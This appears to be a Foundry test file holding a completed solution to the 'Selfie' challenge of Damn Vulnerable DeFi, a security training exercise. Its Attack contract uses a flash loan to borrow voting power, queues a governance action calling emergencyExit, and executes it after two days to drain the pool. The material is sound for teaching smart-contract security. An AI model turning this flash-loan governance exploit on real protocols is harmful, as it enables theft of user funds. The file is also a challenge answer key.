// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Attack attack = new Attack(address(pool), address(governance), address(token), recovery);
        attack.attack();
        vm.warp(block.timestamp + 2 days);
        attack.executeProposal();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
contract Attack is IERC3156FlashBorrower {

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address recovery;
    uint256 actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    /** @dev Constructor will initialize all the
    * relevant contracts we need to interact 
    * with to take all the tokens */
    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    /** @dev We use flashLoan to interact with the SelfiePool contract.
    * We make the attack contract a ERC3156FlashBorrower,
    * since flashLoan checks if onFlashLoan is successful
    * we create the below function to set up the attack.
    * flashLoan, finally checks if the balance is the same
    * which we do not care for since emergencyExit will be 
    * used to drain the contract.*/
    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32){
        token.delegate(address(this));
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
        token.approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }

    /** @dev Call flashLoan to initiate the attack. */
    function attack() external {
        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");
    }

    /** @dev After we setup the attack with onFlashLoan, we wait
    * the 2 day restriction to drain the contract. */
    function executeProposal() external {
        governance.executeAction(actionId);
    }
}
